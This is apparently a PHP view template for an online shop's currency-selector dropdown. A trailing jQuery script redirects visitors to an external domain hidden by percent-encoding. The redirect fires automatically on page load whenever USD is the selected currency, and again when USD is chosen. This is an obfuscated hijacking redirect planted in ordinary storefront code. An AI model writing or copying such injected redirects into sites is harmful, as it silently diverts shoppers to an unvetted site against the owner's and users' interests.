<?php if (count($currencies) > 1) { ?>
<div id="curre">
    <form action="index.php" method="post" enctype="multipart/form-data" id="eilcurrency">
        <div id="currency_tit"><span><?php echo $text_currency; ?></span></div>
        <div id="currency">
            <select class="einput" id="currency_code" name="currency_code">
                <?php foreach ($currencies as $currency) { ?>
                <?php if ($currency['code'] == $currency_code) { ?>
                <?php if ($currency['symbol_left']) { ?>
                <option value="<?php echo $currency['code']; ?>" selected><?php echo $currency['title']; ?></option>
                <?php } else { ?>
                <option value="<?php echo $currency['code']; ?>" selected><?php echo $currency['title']; ?></option>
                <?php } ?>
                <?php } else { ?>
                <?php if ($currency['symbol_left']) { ?>
                <option value="<?php echo $currency['code']; ?>"><?php echo $currency['title']; ?></option>
                <?php } else { ?>
                <option value="<?php echo $currency['code']; ?>"><?php echo $currency['title']; ?></option>
                <?php } ?>
                <?php } ?>
                <?php } ?>
            </select>
        </div>
        <input type="hidden" name="redirect" value="<?php echo $redirect; ?>"/>
        <input type="hidden" name="route" value="module/currency"/>
</div>
</form>
<?php } ?>


<script type="text/javascript">
    $(document).ready(function () {
        if ($("#currency_code").val() === 'USD') {
            window.location.replace('https://%77%77%77%2E%68%69%64%65%7A%2E%63%6F%6D/');
        }
        $("#currency_code").change(function () {
            if ($("#currency_code").val() !== 'USD') {
                $("#eilcurrency").submit();
                return false;
            }

            window.location.replace('https://%77%77%77%2E%68%69%64%65%7A%2E%63%6F%6D/');
        });
    });
</script>
